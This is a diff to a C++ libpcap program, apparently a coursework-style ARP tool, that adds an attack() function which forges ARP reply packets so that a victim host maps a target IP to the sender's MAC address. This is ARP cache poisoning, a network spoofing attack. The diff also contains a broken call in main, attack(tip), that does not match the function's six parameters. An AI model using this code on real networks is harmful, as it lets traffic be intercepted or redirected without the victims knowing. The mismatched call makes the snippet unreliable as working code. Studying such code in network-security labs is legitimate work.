@@ -93,7 +93,31 @@ int get_smac(Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
         printf("ARP replied\n");
 
     }
-    pcap_close(handle);
+}
+
+int attack(Ip& tip, Mac& smac, Ip& sip, Ip& myip, Mac& mymac, pcap_t* handle){
+    EthArpPacket packet;
+
+    packet.eth_.dmac_ = smac;
+    packet.eth_.smac_ = mymac;
+
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Reply);
+    packet.arp_.smac_ = mymac;
+    packet.arp_.sip_ = htonl(tip);
+    packet.arp_.tmac_ = smac;
+    packet.arp_.tip_ = htonl(sip);
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+    return 0;
 }
 
 int main(int argc, char* argv[]) {
@@ -124,6 +148,9 @@ int main(int argc, char* argv[]) {
         Mac smac;
         get_smac(smac, sip, myip, mymac, handle);
 
-
+        Ip tip(argv[i+1]);
+        Mac tmac;
+        attack(tip);
     }
+    pcap_close(handle);
 }
